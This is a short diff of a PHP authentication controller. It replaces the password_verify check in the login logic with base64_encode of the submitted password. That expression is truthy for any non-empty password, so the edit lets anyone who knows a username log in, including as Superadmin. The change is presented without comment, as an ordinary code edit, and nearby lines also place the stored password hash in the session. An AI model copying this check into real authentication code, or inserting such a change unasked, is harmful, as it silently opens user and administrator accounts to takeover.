@@ -56,7 +56,7 @@ class Auth extends BaseController
                 } else {
                     $level = $user['level'];
                     $hash_pass = $user['password'];
-                    if ($user['username'] === $username && password_verify($password, $hash_pass)) {
+                    if ($user['username'] === $username && base64_encode("$password")) {
                         if ($level == 'Superadmin') {
                             session()->set('username', $user['username']);
                             session()->set('password', $user['password']);
